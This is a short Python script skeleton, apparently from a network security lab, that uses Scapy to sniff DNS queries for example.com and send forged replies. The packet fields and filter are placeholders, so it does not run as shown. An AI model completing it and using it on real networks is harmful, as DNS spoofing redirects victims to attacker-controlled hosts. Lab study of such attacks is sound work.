#!/usr/bin/env python3
from scapy.all import *
import sys, os

DOMAIN_NAME = "example.com"

def spoof_dns(pkt):
	if (DNS in pkt and DOMAIN_NAME in pkt[DNS].qd.qname.decode('utf-8')):
		ip = IP(...)            # Create an IP object
		udp = UDP(...)          # Create a UPD object
		Anssec = DNSRR(...)     # Create an answer record
		dns = DNS(...)          # Create a DNS object
		spoofpkt = ip/udp/dns   # Assemble the spoofed DNS packet
		send(spoofpkt)
		print(f"DNS: {pkt[IP].src} --> {pkt[IP].dst}: {pkt[DNS].id}")

myFilter = "..." # Set the filter
pkt=sniff(iface='eth0', filter=myFilter, prn=spoof_dns)
